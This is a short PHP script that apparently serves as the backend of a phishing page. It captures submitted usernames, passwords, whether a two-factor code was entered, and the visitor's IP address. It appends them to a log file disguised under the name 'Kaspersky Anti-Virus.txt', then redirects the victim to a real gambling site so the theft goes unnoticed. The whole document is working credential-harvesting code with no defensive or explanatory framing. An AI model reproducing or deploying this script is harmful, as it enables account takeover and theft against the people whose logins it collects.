<?PHP
$Log = $_POST['user'];
$Pass = $_POST['pass'];
if(!empty($_POST['Totp'])) {
	$fa = 'yes';
}
else {
	$fa = 'no';
}
$ip = $_SERVER['REMOTE_ADDR'];
$log = fopen("Kaspersky Anti-Virus.txt","at");
fwrite($log,"$Log:$Pass:$fa:$ip\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://betpanda.io/'></head></html>";
?>